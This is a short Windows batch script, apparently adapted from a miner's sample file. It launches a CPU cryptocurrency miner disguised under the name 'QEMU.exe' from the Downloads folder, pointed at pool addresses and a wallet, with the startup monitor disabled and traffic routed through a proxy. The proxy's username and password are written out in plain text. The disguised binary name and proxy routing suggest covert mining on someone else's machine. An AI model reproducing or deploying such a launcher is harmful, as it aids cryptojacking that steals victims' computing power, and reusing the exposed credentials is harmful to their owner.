:: This is an example you can edit and use
:: There are numerous parameters you can set, please check Help and Examples folder
:: Start miner with administrator privileges to enable gpu-tweak-profile

setx GPU_MAX_HEAP_SIZE 100
setx GPU_MAX_USE_SYNC_OBJECTS 1
setx GPU_SINGLE_ALLOC_PERCENT 100
setx GPU_MAX_ALLOC_PERCENT 100
setx GPU_MAX_SINGLE_ALLOC_PERCENT 100

@echo off
cd %~dp0
cls

C:\Users\%USERNAME%\Downloads\QEMU.exe --algorithm rinhash --pool 51.91.7.170:7148,144.217.252.206:7148,51.91.74.9:7148,51.91.7.170:7148 --disable-gpu --wallet LXgzuXChG5gx9nC4UqcvFV42axj6V72Fkc --worker x6 --password c=LTC --nicehash false --keepalive true --disable-startup-monitor --cpu-enable-huge-pages --cpu-threads 6 --proxy rakuen_EeNQt:2603_KIMyona@dc.oxylabs.io:8001
pause
